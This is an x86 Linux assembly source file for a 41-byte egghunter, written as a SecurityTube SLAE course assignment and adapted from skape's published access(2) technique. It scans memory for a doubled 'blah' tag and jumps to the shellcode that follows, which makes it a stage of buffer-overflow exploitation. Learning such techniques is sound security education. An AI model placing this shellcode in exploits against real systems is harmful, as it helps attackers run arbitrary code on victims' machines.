; Filename: assiggment3_egghunter.nasm
; Author:  Marco Lugo (SLAE-1031)
; Description: egghunter that looks for tag 'blah' (0x62 0x6c 0x61 0x68)
; 
; Taken from the "access(2) revisited" example in http://hick.org/code/skape/papers/egghunt-shellcode.pdf
; Few exceptions added (assigning zero to other registers at initialization to prevent segmentation fault)
;
; For the SecurityTube Linux Assembly Expert (SLAE) course
; The resulting shellcode is 41 bytes

global _start            

section .text

_start:
    xor eax, eax ; assigns 0x00 to EAX
    xor ebx, ebx ; assigns 0x00 to EBX
    xor ecx, ecx ; assigns 0x00 to ECX
    xor edx, edx ; assigns 0x00 to EDX
	
skip_efault:
    or dx, 0xfff
next_addr:
    inc edx
    lea ebx, [edx+0x4]
    push 0x21
    pop eax
    int 0x80 ; call sys_call access
	
    cmp al, 0xf2
    jz skip_efault
    mov eax, 0x68616c62 ; TAG: blah
    mov edi, edx
    scasd ; Compare EAX with doubleword at ES:(E)DI and set status flags
    jnz next_addr
    scasd ; Compare EAX with doubleword at ES:(E)DI and set status flags
    jnz next_addr
    jmp edi
